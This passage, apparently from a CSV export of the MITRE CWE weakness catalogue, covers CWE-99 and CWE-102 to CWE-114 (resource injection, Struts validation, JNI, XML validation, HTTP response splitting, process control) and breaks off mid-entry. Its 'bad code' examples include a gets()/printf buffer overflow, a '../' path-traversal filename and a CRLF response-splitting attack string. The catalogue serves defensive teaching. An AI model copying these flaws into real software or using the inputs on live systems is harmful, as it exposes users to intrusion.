the application may still be subject to compromise.Be careful to avoidCWE-243and other weaknesses related to jails.Effectiveness: LimitedNote:The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.Phases:  Architecture and Design; OperationStrategy:  Environment HardeningRun your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.When validating filenames, use stringent lists that limit the character set to be used. If feasible, only allow a single ""."" character in the filename to avoid weaknesses such asCWE-23, and exclude directory separators such as ""/"" to avoidCWE-36. Use a list of allowable file extensions, which will help to avoidCWE-434.Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering ""/"" is insufficient protection if the filesystem also supports the use of ""\"" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ""../"" sequences are removed from the "".../...//"" string in a sequential fashion, two instances of ""../"" would be removed from the original string, but the remaining characters would still form the ""../"" string.Effectiveness: HighPhases:  Architecture and Design; OperationStrategy:  Attack Surface ReductionStore library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately.This significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface.Phases:  Architecture and Design; ImplementationStrategy:  Attack Surface ReductionUnderstand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.Many file inclusion problems occur because the programmer assumed that certain inputs could not be modified, especially for cookies and URL components.Phase:  OperationStrategy:  FirewallUse an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.Effectiveness: ModerateNote:An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.Phases:  Operation; ImplementationStrategy:  Environment HardeningDevelop and run your code in the most recent versions of PHP available, preferably PHP 6 or later. Many of the highly risky features in earlier PHP interpreters have been removed, restricted, or disabled by default.Phases:  Operation; ImplementationStrategy:  Environment HardeningWhen using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such asCWE-95,CWE-621, and similar issues.Often, programmers do not protect direct access to files intended only to be included by core programs. These include files may assume that critical variables have already been initialized by the calling program. As a result, the use of register_globals combined with the ability to directly access the include file may allow attackers to conduct file inclusion attacks. This remains an extremely common pattern as of 2009.Phase:  OperationStrategy:  Environment HardeningSet allow_url_fopen to false, which limits the ability to include files from remote locations.Effectiveness: HighNote:Be aware that some versions of PHP will still accept ftp:// and other URI schemes. In addition, this setting does not protect the code from path traversal attacks (CWE-22), which are frequently successful against the same vulnerable code that allows remote file inclusion."
CWE-99: Improper Control of Resource Identifiers ('Resource Injection'),"The product receives input from an upstream component, but it does not restrict or incorrectly restricts the input before it is used as an identifier for a resource that may be outside the intended sphere of control.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Application Data; Modify Application Data; Read Files or Directories; Modify Files or DirectoriesAn attacker could gain access to or modify sensitive data or system resources. This could allow access to protected files or directories including configuration files and files containing sensitive information., Likelihood: ","Example 1The following Java code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as ""../../tomcat/conf/server.xml"", which causes the application to delete one of its own configuration files.(bad code)Example Language:JavaString rName = request.getParameter(""reportName"");File rFile = new File(""/usr/local/apfr/reports/"" + rName);...rFile.delete();Example 2The following code uses input from the command line to determine which file to open and echo back to the user. If the program runs with privileges and malicious users can create soft links to the file, they can use the program to read the first part of any file on the system.(bad code)Example Language:C++ifstream ifs(argv[0]);string s;ifs >> s;cout << s;The kind of resource the data affects indicates the kind of content that may be dangerous. For example, data containing special characters like period, slash, and backslash, are risky when used in methods that interact with the file system. (Resource injection, when it is related to file system resources, sometimes goes by the name ""path manipulation."") Similarly, data that contains URLs and URIs is risky for functions that create remote connections.","Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, it can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright."
CWE CATEGORY: DEPRECATED: Technology-Specific Input Validation Problems,"This category has been deprecated. It was originally intended as a ""catch-all"" for input validation problems in technologies that did not have their own CWE, but introduces unnecessary depth to the hierarchy.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: DEPRECATED: Struts Validation Problems,"This category has been deprecated. It was originally used for organizing the Development View (CWE-699), but it introduced unnecessary complexity and depth to the resulting tree.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-102: Struts: Duplicate Validation Forms,"The product uses multiple validation forms with the same name, which might cause the Struts Validator to validate a form that the programmer does not expect.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ","Example 1These two Struts validation forms have the same name.(bad code)Example Language:XML<form-validation><formset><form name=""ProjectForm""> ... </form><form name=""ProjectForm""> ... </form></formset></form-validation>It is not certain which form will be used by Struts. It is critically important that validation logic be maintained and kept in sync with the rest of the product.","Phase:  ImplementationThe DTD or schema validation will not catch the duplicate occurrence of the same form name. To find the issue in the implementation, manual checks or automated static analysis could be applied to the xml configuration files."
CWE-103: Struts: Incomplete validate() Method Definition,"The product has a validator form that either does not define a validate() method, or defines a validate() method but does not call super.validate().","Scope: Other, Impact: Technical Impact:OtherDisabling the validation framework for a form exposes the product to numerous types of attacks. Unchecked input is the root cause of vulnerabilities like cross-site scripting, process control, and SQL injection., Likelihood: ; Scope: ConfidentialityIntegrityAvailabilityOther, Impact: Technical Impact:OtherAlthough J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack., Likelihood:","Example 1In the following Java example the class RegistrationForm is a Struts framework ActionForm Bean that will maintain user input data from a registration webpage for an online business site. The user will enter registration data and the RegistrationForm bean in the Struts framework will maintain the user data. Tthe RegistrationForm class implements the validate method to validate the user input entered into the form.(bad code)Example Language:Javapublic class RegistrationForm extends org.apache.struts.validator.ValidatorForm {// private variables for registration formprivate String name;private String email;...public RegistrationForm() {super();}public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {ActionErrors errors = new ActionErrors();if (getName() == null || getName().length() < 1) {errors.add(""name"", new ActionMessage(""error.name.required""));}return errors;}// getter and setter methods for private variables...}Although the validate method is implemented in this example the method does not call the validate method of the ValidatorForm parent class with a call super.validate(). Without the call to the parent validator class only the custom validation will be performed and the default validation will not be performed. The following example shows that the validate method of the ValidatorForm class is called within the implementation of the validate method.(good code)Example Language:Javapublic class RegistrationForm extends org.apache.struts.validator.ValidatorForm {// private variables for registration formprivate String name;private String email;...public RegistrationForm() {super();}public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {ActionErrors errors = super.validate(mapping, request);if (errors == null) {errors = new ActionErrors();}if (getName() == null || getName().length() < 1) {errors.add(""name"", new ActionMessage(""error.name.required""));}return errors;}// getter and setter methods for private variables...}",Phase:  ImplementationImplement the validate() method and call super.validate() within that method.
CWE-104: Struts: Form Bean Does Not Extend Validation Class,"If a form bean does not extend an ActionForm subclass of the Validator framework, it can expose the application to other weaknesses related to insufficient input validation.","Scope: Other, Impact: Technical Impact:OtherBypassing the validation framework for a form exposes the application to numerous types of attacks. Unchecked input is an important component of vulnerabilities like cross-site scripting, process control, and SQL injection., Likelihood: ; Scope: ConfidentialityIntegrityAvailabilityOther, Impact: Technical Impact:OtherAlthough J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack., Likelihood:","Example 1In the following Java example the class RegistrationForm is a Struts framework ActionForm Bean that will maintain user information from a registration webpage for an online business site. The user will enter registration data and through the Struts framework the RegistrationForm bean will maintain the user data.(bad code)Example Language:Javapublic class RegistrationForm extends org.apache.struts.action.ActionForm {// private variables for registration formprivate String name;private String email;...public RegistrationForm() {super();}// getter and setter methods for private variables...}However, the RegistrationForm class extends the Struts ActionForm class which does not allow the RegistrationForm class to use the Struts validator capabilities. When using the Struts framework to maintain user data in an ActionForm Bean, the class should always extend one of the validator classes, ValidatorForm, ValidatorActionForm, DynaValidatorForm or DynaValidatorActionForm. These validator classes provide default validation and the validate method for custom validation for the Bean object to use for validating input data. The following Java example shows the RegistrationForm class extending the ValidatorForm class and implementing the validate method for validating input data.(good code)Example Language:Javapublic class RegistrationForm extends org.apache.struts.validator.ValidatorForm {// private variables for registration formprivate String name;private String email;...public RegistrationForm() {super();}public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {...}// getter and setter methods for private variables...}Note that the ValidatorForm class itself extends the ActionForm class within the Struts framework API.",Phase:  ImplementationEnsure that all forms extend one of the Validation Classes.
CWE-105: Struts: Form Field Without Validator,"The product has a form field that is not validated by a corresponding validation form, which can introduce other weaknesses related to insufficient input validation.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ; Scope: Integrity, Impact: Technical Impact:Bypass Protection MechanismIf unused fields are not validated, shared business logic in an action may allow attackers to bypass the validation checks that are performed for other uses of the form., Likelihood: ","Example 1In the following example the Java class RegistrationForm is a Struts framework ActionForm Bean that will maintain user input data from a registration webpage for an online business site. The user will enter registration data and, through the Struts framework, the RegistrationForm bean will maintain the user data in the form fields using the private member variables. The RegistrationForm class uses the Struts validation capability by extending the ValidatorForm class and including the validation for the form fields within the validator XML file, validator.xml.(result)public class RegistrationForm extends org.apache.struts.validator.ValidatorForm {// private variables for registration formprivate String name;private String address;private String city;private String state;private String zipcode;private String phone;private String email;public RegistrationForm() {super();}// getter and setter methods for private variables...}The validator XML file, validator.xml, provides the validation for the form fields of the RegistrationForm.(bad code)Example Language:XML<form-validation><formset><form name=""RegistrationForm""><field property=""name"" depends=""required""><arg position=""0"" key=""prompt.name""/></field><field property=""address"" depends=""required""><arg position=""0"" key=""prompt.address""/></field><field property=""city"" depends=""required""><arg position=""0"" key=""prompt.city""/></field><field property=""state"" depends=""required,mask""><arg position=""0"" key=""prompt.state""/><var><var-name>mask</var-name><var-value>[a-zA-Z]{2}</var-value></var></field><field property=""zipcode"" depends=""required,mask""><arg position=""0"" key=""prompt.zipcode""/><var><var-name>mask</var-name><var-value>\d{5}</var-value></var></field></form></formset></form-validation>However, in the previous example the validator XML file, validator.xml, does not provide validators for all of the form fields in the RegistrationForm. Validator forms are only provided for the first five of the seven form fields. The validator XML file should contain validator forms for all of the form fields for a Struts ActionForm bean. The following validator.xml file for the RegistrationForm class contains validator forms for all of the form fields.(good code)Example Language:XML<form-validation><formset><form name=""RegistrationForm""><field property=""name"" depends=""required""><arg position=""0"" key=""prompt.name""/></field><field property=""address"" depends=""required""><arg position=""0"" key=""prompt.address""/></field><field property=""city"" depends=""required""><arg position=""0"" key=""prompt.city""/></field><field property=""state"" depends=""required,mask""><arg position=""0"" key=""prompt.state""/><var><var-name>mask</var-name><var-value>[a-zA-Z]{2}</var-value></var></field><field property=""zipcode"" depends=""required,mask""><arg position=""0"" key=""prompt.zipcode""/><var><var-name>mask</var-name><var-value>\d{5}</var-value></var></field><field property=""phone"" depends=""required,mask""><arg position=""0"" key=""prompt.phone""/><var><var-name>mask</var-name><var-value>^([0-9]{3})(-)([0-9]{4}|[0-9]{4})$</var-value></var></field><field property=""email"" depends=""required,email""><arg position=""0"" key=""prompt.email""/></field></form></formset></form-validation>","Phase:  ImplementationValidate all form fields. If a field is unused, it is still important to constrain it so that it is empty or undefined."
CWE-106: Struts: Plug-in Framework not in Use,"When an application does not use an input validation framework such as the Struts Validator, there is a greater risk of introducing weaknesses related to insufficient input validation.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ","Example 1In the following Java example the class RegistrationForm is a Struts framework ActionForm Bean that will maintain user input data from a registration webpage for an online business site. The user will enter registration data and, through the Struts framework, the RegistrationForm bean will maintain the user data.(bad code)Example Language:Javapublic class RegistrationForm extends org.apache.struts.action.ActionForm {// private variables for registration formprivate String name;private String email;...public RegistrationForm() {super();}// getter and setter methods for private variables...}However, the RegistrationForm class extends the Struts ActionForm class which does use the Struts validator plug-in to provide validator capabilities. In the following example, the RegistrationForm Java class extends the ValidatorForm and Struts configuration XML file, struts-config.xml, instructs the application to use the Struts validator plug-in.(good code)Example Language:Javapublic class RegistrationForm extends org.apache.struts.validator.ValidatorForm {// private variables for registration formprivate String name;private String email;...public RegistrationForm() {super();}public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {...}// getter and setter methods for private variables...}The plug-in tag of the Struts configuration XML file includes the name of the validator plug-in to be used and includes a set-property tag to instruct the application to use the file, validator-rules.xml, for default validation rules and the file, validation.XML, for custom validation.(good code)Example Language:XML<struts-config><form-beans><form-bean name=""RegistrationForm"" type=""RegistrationForm""/></form-beans>...<!-- ========================= Validator plugin ================================= --><plug-in className=""org.apache.struts.validator.ValidatorPlugIn""><set-propertyproperty=""pathnames""value=""/WEB-INF/validator-rules.xml,/WEB-INF/validation.xml""/></plug-in></struts-config>","Phase:  Architecture and DesignStrategy:  Input ValidationUse an input validation framework such as Struts.Phase:  Architecture and DesignStrategy:  Libraries or FrameworksUse an input validation framework such as Struts.Phase:  ImplementationStrategy:  Input ValidationUse the Struts Validator to validate all program input before it is processed by the application. Ensure that there are no holes in the configuration of the Struts Validator. Example uses of the validator include checking to ensure that:Phone number fields contain only valid characters in phone numbersBoolean values are only ""T"" or ""F""Free-form strings are of a reasonable length and compositionPhase:  ImplementationStrategy:  Libraries or FrameworksUse the Struts Validator to validate all program input before it is processed by the application. Ensure that there are no holes in the configuration of the Struts Validator. Example uses of the validator include checking to ensure that:Phone number fields contain only valid characters in phone numbersBoolean values are only ""T"" or ""F""Free-form strings are of a reasonable length and composition"
CWE-107: Struts: Unused Validation Form,An unused validation form indicates that validation logic is not up-to-date.,"Scope: Other, Impact: Technical Impact:Quality Degradation, Likelihood: ","Example 1In the following example the class RegistrationForm is a Struts framework ActionForm Bean that will maintain user input data from a registration webpage for an online business site. The user will enter registration data and, through the Struts framework, the RegistrationForm bean will maintain the user data in the form fields using the private member variables. The RegistrationForm class uses the Struts validation capability by extending the ValidatorForm class and including the validation for the form fields within the validator XML file, validator.xml.(bad code)Example Language:Javapublic class RegistrationForm extends org.apache.struts.validator.ValidatorForm {// private variables for registration formprivate String name;private String address;private String city;private String state;private String zipcode;// no longer using the phone form field// private String phone;private String email;public RegistrationForm() {super();}// getter and setter methods for private variables...}(bad code)Example Language:XML<form-validation><formset><form name=""RegistrationForm""><field property=""name"" depends=""required""><arg position=""0"" key=""prompt.name""/></field><field property=""address"" depends=""required""><arg position=""0"" key=""prompt.address""/></field><field property=""city"" depends=""required""><arg position=""0"" key=""prompt.city""/></field><field property=""state"" depends=""required,mask""><arg position=""0"" key=""prompt.state""/><var><var-name>mask</var-name><var-value>[a-zA-Z]{2}</var-value></var></field><field property=""zipcode"" depends=""required,mask""><arg position=""0"" key=""prompt.zipcode""/><var><var-name>mask</var-name><var-value>\d{5}</var-value></var></field><field property=""phone"" depends=""required,mask""><arg position=""0"" key=""prompt.phone""/><var><var-name>mask</var-name><var-value>^([0-9]{3})(-)([0-9]{4}|[0-9]{4})$</var-value></var></field><field property=""email"" depends=""required,email""><arg position=""0"" key=""prompt.email""/></field></form></formset></form-validation>However, the validator XML file, validator.xml, for the RegistrationForm class includes the validation form for the user input form field ""phone"" that is no longer used by the input form and the RegistrationForm class. Any validation forms that are no longer required should be removed from the validator XML file, validator.xml.The existence of unused forms may be an indication to attackers that this code is out of date or poorly maintained.",Phase:  ImplementationRemove the unused Validation Form from the validation.xml file.
CWE-108: Struts: Unvalidated Action Form,Every Action Form must have a corresponding validation form.,"Scope: Other, Impact: Technical Impact:OtherIf an action form mapping does not have a validation form defined, it may be vulnerable to a number of attacks that rely on unchecked input. Unchecked input is the root cause of some of today's worst and most common software security problems. Cross-site scripting, SQL injection, and process control vulnerabilities all stem from incomplete or absent input validation., Likelihood: ; Scope: ConfidentialityIntegrityAvailabilityOther, Impact: Technical Impact:OtherAlthough J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack., Likelihood:",无示范例子,"Phase:  ImplementationStrategy:  Input ValidationMap every Action Form to a corresponding validation form.An action or a form may perform validation in other ways, but the Struts Validator provides an excellent way to verify that all input receives at least a basic level of validation. Without this approach, it is difficult, and often impossible, to establish with a high level of confidence that all input is validated."
CWE-109: Struts: Validator Turned Off,"Automatic filtering via a Struts bean has been turned off, which disables the Struts Validator and custom validation logic. This exposes the application to other weaknesses related to insufficient input validation.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism, Likelihood: ","Example 1This mapping defines an action for a download form:(bad code)Example Language:XML<action path=""/download""type=""com.website.d2.action.DownloadAction""name=""downloadForm""scope=""request""input="".download""validate=""false""></action>This mapping has disabled validation. Disabling validation exposes this action to numerous types of attacks.",Phase:  ImplementationEnsure that an action form mapping enables validation. Set the validate field to true.
CWE-110: Struts: Validator Without Form Field,Validation fields that do not appear in forms they are associated with indicate that the validation logic is out of date.,"Scope: Other, Impact: Technical Impact:OtherIt is critically important that validation logic be maintained and kept in sync with the rest of the application. Unchecked input is the root cause of some of today's worst and most common software security problems. Cross-site scripting, SQL injection, and process control vulnerabilities all stem from incomplete or absent input validation., Likelihood: ","Example 1This example shows an inconsistency between an action form and a validation form. with a third field.This first block of code shows an action form that has two fields, startDate and endDate.(bad code)Example Language:Javapublic class DateRangeForm extends ValidatorForm {String startDate, endDate;public void setStartDate(String startDate) {this.startDate = startDate;}public void setEndDate(String endDate) {this.endDate = endDate;}}This second block of related code shows a validation form with a third field: scale. The presence of the third field suggests that DateRangeForm was modified without taking validation into account.(bad code)Example Language:XML<form name=""DateRangeForm""><field property=""startDate"" depends=""date""><arg0 key=""start.date""/></field><field property=""endDate"" depends=""date""><arg0 key=""end.date""/></field><field property=""scale"" depends=""integer""><arg0 key=""range.scale""/></field></form>",无可能的缓解方案
CWE-111: Direct Use of Unsafe JNI,"When a Java application uses the Java Native Interface (JNI) to call code written in another programming language, it can expose the application to weaknesses in that code, even if those weaknesses cannot occur in Java.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism, Likelihood: ","Example 1The following code defines a class named Echo. The class declares one native method (defined below), which uses C to echo commands entered on the console back to the user. The following C code defines the native method implemented in the Echo class:(bad code)Example Language:Javaclass Echo {public native void runEcho();static {System.loadLibrary(""echo"");}public static void main(String[] args) {new Echo().runEcho();}}(bad code)Example Language:C#include <jni.h>#include ""Echo.h""//the java class above compiled with javah#include <stdio.h>JNIEXPORT void JNICALLJava_Echo_runEcho(JNIEnv *env, jobject obj){char buf[64];gets(buf);printf(buf);}Because the example is implemented in Java, it may appear that it is immune to memory issues like buffer overflow vulnerabilities. Although Java does do a good job of making memory operations safe, this protection does not extend to vulnerabilities occurring in source code written in other languages that are accessed using the Java Native Interface. Despite the memory protections offered in Java, the C code in this example is vulnerable to a buffer overflow because it makes use of gets(), which does not check the length of its input.The Sun Java(TM) Tutorial provides the following description of JNI [See Reference]: The JNI framework lets your native method utilize Java objects in the same way that Java code uses these objects. A native method can create Java objects, including arrays and strings, and then inspect and use these objects to perform its tasks. A native method can also inspect and use objects created by Java application code. A native method can even update Java objects that it created or that were passed to it, and these updated objects are available to the Java application. Thus, both the native language side and the Java side of an application can create, update, and access Java objects and then share these objects between them.The vulnerability in the example above could easily be detected through a source code audit of the native method implementation. This may not be practical or possible depending on the availability of the C source code and the way the project is built, but in many cases it may suffice. However, the ability to share objects between Java and native methods expands the potential risk to much more insidious cases where improper data handling in Java may lead to unexpected vulnerabilities in native code or unsafe operations in native code corrupt data structures in Java. Vulnerabilities in native code accessed through a Java application are typically exploited in the same manner as they are in applications written in the native language. The only challenge to such an attack is for the attacker to identify that the Java application uses native code to perform certain operations. This can be accomplished in a variety of ways, including identifying specific behaviors that are often implemented with native code or by exploiting a system information exposure in the Java application that reveals its use of JNI [See Reference].",Phase:  ImplementationImplement error handling around the JNI call.Phase:  ImplementationStrategy:  RefactoringDo not use JNI calls if you don't trust the native library.Phase:  ImplementationStrategy:  RefactoringBe reluctant to use JNI calls. A Java API equivalent may exist.
CWE-112: Missing XML Validation,The product accepts XML from an untrusted source but does not validate the XML against the proper schema.,"Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ","Example 1The following code loads and parses an XML file.(bad code)Example Language:Java// Read DOMtry {...DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();factory.setValidating( false );....c_dom = factory.newDocumentBuilder().parse( xmlFile );} catch(Exception ex) {...}The XML file is loaded without validating it against a known XML Schema or DTD.Example 2The following code creates a DocumentBuilder object to be used in building an XML document.(bad code)Example Language:JavaDocumentBuilderFactory builderFactory = DocumentBuilderFactory.newInstance();builderFactory.setNamespaceAware(true);DocumentBuilder builder = builderFactory.newDocumentBuilder();The DocumentBuilder object does not validate an XML document against a schema, making it possible to create an invalid XML document.","Phase:  Architecture and DesignStrategy:  Input ValidationAlways validate XML input against a known XML Schema or DTD.It is not possible for an XML parser to validate all aspects of a document's content because a parser cannot understand the complete semantics of the data. However, a parser can do a complete and thorough job of checking the document's structure and therefore guarantee to the code that processes the document that the content is well-formed."
CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting'),"The product receives data from an HTTP agent/component (e.g., web server, proxy, browser, etc.), but it does not neutralize or incorrectly neutralizes CR and LF characters before the data is included in outgoing HTTP headers.","Scope: IntegrityAccess Control, Impact: Technical Impact:Modify Application Data; Gain Privileges or Assume IdentityCR and LF characters in an HTTP header may give attackers control of the remaining headers and body of the message that the application intends to send/receive, as well as allowing them to create additional messages entirely under their control., Likelihood: ","Example 1The following code segment reads the name of the author of a weblog entry, author, from an HTTP request and sets it in a cookie header of an HTTP response.(bad code)Example Language:JavaString author = request.getParameter(AUTHOR_PARAM);...Cookie cookie = new Cookie(""author"", author);cookie.setMaxAge(cookieExpiration);response.addCookie(cookie);Assuming a string consisting of standard alpha-numeric characters, such as ""Jane Smith"", is submitted in the request the HTTP response including this cookie might take the following form:(result)HTTP/1.1 200 OK...Set-Cookie: author=Jane Smith...However, because the value of the cookie is composed of unvalidated user input, the response will only maintain this form if the value submitted for AUTHOR_PARAM does not contain any CR and LF characters. If an attacker submits a malicious string, such as(attack code)Wiley Hacker\r\nHTTP/1.1 200 OK\r\nthen the HTTP response would be split into two responses of the following form:(result)HTTP/1.1 200 OK...Set-Cookie: author=Wiley HackerHTTP/1.1 200 OK...The second response is completely controlled by the attacker and can be constructed with any header and body content desired. The ability to construct arbitrary HTTP responses permits a variety of resulting attacks, including:cross-user defacementweb and browser cache poisoningcross-site scriptingpage hijackingExample 2An attacker can make a single request to a vulnerable server that will cause the server to create two responses, the second of which may be misinterpreted as a response to a different request, possibly one made by another user sharing the same TCP connection with the server.Cross-User Defacement can be accomplished by convincing the user to submit the malicious request themselves, or remotely in situations where the attacker and the user share a common TCP connection to the server, such as a shared proxy server.In the best case, an attacker can leverage this ability to convince users that the application has been hacked, causing users to lose confidence in the security of the application.In the worst case, an attacker may provide specially crafted content designed to mimic the behavior of the application but redirect private information, such as account numbers and passwords, back to the attacker.Example 3The impact of a maliciously constructed response can be magnified if it is cached, either by a web cache used by multiple users or even the browser cache of a single user.Cache Poisoning: if a response is cached in a shared web cache, such as those commonly found in proxy servers, then all users of that cache will continue receive the malicious content until the cache entry is purged. Similarly, if the response is cached in the browser of an individual user, then that user will continue to receive the malicious content until the cache entry is purged, although the user of the local browser instance will be affected.Example 4Once attackers have control of the responses sent by an application, they have a choice of a variety of malicious content to provide users.Cross-Site Scripting: cross-site scripting is common form of attack where malicious JavaScript or other code included in a response is executed in the user's browser.The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.The most common and dangerous attack vector against users of a vulnerable application uses JavaScript to transmit session and authentication information back to the attacker who can then take complete control of the victim's account.Example 5In addition to using a vulnerable application to send malicious content to a user, the same weakness can also be leveraged to redirect sensitive content generated by the server to the attacker instead of the intended user.Page Hijacking: by submitting a request that results in two responses, the intended response from the server and the response generated by the attacker, an attacker can cause an intermediate node, such as a shared proxy server, to misdirect a response generated by the server to the attacker instead of the intended user.Because the request made by the attacker generates two responses, the first is interpreted as a response to the attacker's request, while the second remains in limbo. When the user makes a legitimate request through the same TCP connection, the attacker's request is already waiting and is interpreted as a response to the victim's request. The attacker then sends a second request to the server, to which the proxy server responds with the server generated request intended for the victim, thereby compromising any sensitive information in the headers or body of the response intended for the victim.","Phase:  ImplementationStrategy:  Input ValidationConstruct HTTP headers very carefully, avoiding the use of non-validated input data.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. If an input does not strictly conform to specifications, reject it or transform it into something that conforms.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingUse and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-114: Process Control,Executing commands or loading libraries from an untrusted source or in an untrusted environment can cause an application to execute malicious commands (and payloads) on behalf of an attacker.,"Scope: ConfidentialityIntegrityAvailability, Impact: Technical Impact:Execute Unauthorized Code or Commands, Likelihood: ","Example 1The following code uses System.loadLibrary() to load code from a native library named library.dll, which is normally found in a standard system directory.(bad code)Example Language:Java...System.loadLibrary(""library.dll"");...The problem here is that System.loadLibrary() accepts a library name, not a path, for the library to be loaded. From the Java 1.4.2 API documentation this function behaves as follows [1]: A file containing native code is loaded from the local file system from a place where library files are conventionally obtained. The details of this process are implementation-dependent. The mapping from a library name to a specific filename is done in a system-specific manner. If an attacker is able to place a malicious copy of library.dll higher in the search order than file the application intends to load, then the application will load the malicious copy instead of the intended file. Because of the nature of the application, it runs with elevated privileges, which means the contents of the attacker's library.dll will now be run with elevated privileges, possibly giving them complete control of the system.Example 2The following code from a privileged application uses a registry entry to determine the directory in which it is installed and loads a library file based on a relative path from the specified directory.(bad code)Example Language:C...RegQueryValueEx(hkey, ""APPHOME"",0, 0, (BYTE*)home, &size);char* lib=(char*)malloc(strlen(home)+strlen(INITLIB));if (lib) {strcpy(lib,home);strcat(lib,INITCMD);LoadLibrary(lib);}...The code in this example allows an attacker to load an arbitrary library, from which code will be executed with the elevated privilege of the application, by modifying a registry key to specify a different path containing a malicious version of INITLIB. Because the program does not validate the value read from the environment, if an attacker can control the value of APPHOME, they can fool the application into running malicious code.Example 3The following code is from a web-based administration utility that allows users access to an interface through which they can update their profile on the system. The utility makes use of a library named liberty.dll, which is normally found in a standard system directory.(bad code)Example 